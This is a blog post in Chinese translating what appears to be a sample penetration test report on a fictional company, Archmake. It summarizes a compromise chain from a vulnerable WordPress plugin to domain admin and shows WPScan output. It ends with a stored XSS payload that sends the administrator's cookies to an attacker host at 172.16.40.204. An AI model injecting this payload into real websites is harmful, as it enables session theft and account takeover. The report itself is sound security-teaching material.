---
layout: post
title: "offensive security pentest report 翻译"
description: ""
category: 渗透测试
tags: [report]
---
{% include JB/setup %}

## 摘要 ##

Offensive security已经被授权对Archmake的外部网站进行一次渗透测试.测试评估的方式是模拟恶意的攻击者对公司进行目的明确的渗透.主要测试目标包括:

1, 确认一个远程的攻击者能否穿透Archmake的安全防线.

2, 评估安全攻击对公司的订单系统,客户的保密信息以及Archmake其他信息系统可能造成的影响.



## 结果概述 ##

在初期的信息搜集阶段,发现Archmake公司仅仅只有一个web网站和一个邮件服务器.可供攻击的服务比较少.

在对网站的安全评估中,发现它安装了一个有漏洞的WordPress插件.成功利用这个漏洞,取得了WordPress的管理权限.然后反弹了一个交互式的shell并成功提到root权限.

获取了网站服务器的权限之后,开始对内网进行渗透,经过一番尝试,成功获取到了域管理员的权限.之后对内网进行拓扑分析,发现了内网的公司数据库并成功控制.这个数据库不仅存储了订单信息和客户资料,还保存了信用卡相关信息.通过控制这个系统,攻击者可以直接从公司账户提取现金.

## 测试过程 ##

# WordPress漏洞利用 #

在对目标系统进行搜集的时候发现网站采用了wordpress 3.3.1搭建.我们在对WordPress进行代码审计的同时,用WPScan扫描了目标网站,发现一个不安全的插件:


	./wpscan.rb --url www.Archmake.com --enumerate p
	____________________________________________________
	__
	_______
	_____
	\ \
	/ / __ \ / ____|
	\ \ /\ / /| |__) | (___
	___ __ _ _ __
	\ \/ \/ / | ___/ \___ \ / __|/ _` | '_ \
	\ /\ / | |
	____) | (__| (_| | | | |
	\/ \/
	|_|
	|_____/ \___|\__,_|_| |_| v1.1
	WordPress Security Scanner by ethicalhack3r.co.uk
	Sponsored by the RandomStorm Open Source Initiative
	_____________________________________________________
	| URL: http://www.Archmake.com/
	| Started on Tue Jan 24 18:44:49 2012
	[!] The WordPress theme in use is called "twentyeleven".
	[!] The WordPress "http://www.Archmake.com/readme.html" file exists.
	[!] WordPress version 3.3.1 identified from meta generator.
	[+] Enumerating installed plugins...
	Checking for 2892 total plugins... 100% complete.
	[+] We found 2 plugins:
	Name: relevanssi
	Location: http://www.Archmake.com/wp-content/plugins/relevanssi/
	Directory listing enabled? Yes.
	Name: relevanssi
	Location: http://www.Archmake.com/wp-content/plugins/relevanssi/
	Directory listing enabled? Yes.
	[+] There were 1 vulnerabilities identified from the plugin names:
	[!] Relevanssi 2.7.2 Wordpress Plugin Stored XSS Vulnerability
	* Reference: http://www.exploit-db.com/exploits/16233/
	[+] Finished at Tue Jan 24 18:45:30 2012	  


正如WPScan扫描结果展示的一样,这个Relevanssi插件存在一个XSS漏洞.成功利用这个漏洞可以窃取到管理员的cookies.

第一步,我们在Archmake网站的搜索栏中插入如下代码:

	<script>new	Image().src="http://172.16.40.204/p.php?cookie="+document.cookie; </script>

![pic]({{site.img_url}}offensive1.png)


